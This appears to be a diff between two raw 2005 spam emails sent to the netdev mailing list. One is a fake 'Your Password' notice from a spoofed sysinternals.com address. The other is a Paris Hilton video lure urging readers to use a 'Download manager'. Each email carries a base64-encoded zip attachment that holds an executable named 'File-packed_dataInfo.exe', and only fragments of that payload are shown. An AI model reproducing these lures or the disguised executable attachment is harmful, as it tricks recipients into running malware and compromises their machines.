@@ -1,29 +1,30 @@
-From: postman@sysinternals.com
-Subject: Your Password
-Date: Wed, 21 Dec 2005 16:54:58 GMT
-Message-ID: <cf4bd5cacc16cc70@sysinternals.com>
+From: office@metaparadigm.com
+Subject: Paris Hilton & Nicole Richie
+Date: Wed, 21 Dec 2005 16:36:15 UTC
+Message-ID: <5cad.3e7cab42b7d6c@oss.sgi.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="====6f08fa8ca445cd5.6fd812d"
+Content-Type: multipart/mixed; boundary="===ffb1f2a76fff.dba88d2ee1ed"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: smntp@oss.sgi.com
+To: netdev@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---====6f08fa8ca445cd5.6fd812d
+--===ffb1f2a76fff.dba88d2ee1ed
 
-Account and Password Information are attached!
+The Simple Life:
 
+View Paris Hilton & Nicole Richie video clips , pictures & more ;)
+Download is free until Jan, 2006!
 
-***** Go to: http://www.sysinternals.com
-***** Email: postman@sysinternals.com
---====6f08fa8ca445cd5.6fd812d
-Content-Type: application/octet-stream; name=reg_pass-data.zip
+Please use our Download manager.
+--===ffb1f2a76fff.dba88d2ee1ed
+Content-Type: application/octet-stream; name=downloadm.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="reg_pass-data.zip"
+Content-Disposition: attachment; filename="downloadm.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1000,4 +1001,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---====6f08fa8ca445cd5.6fd812d--
+--===ffb1f2a76fff.dba88d2ee1ed--
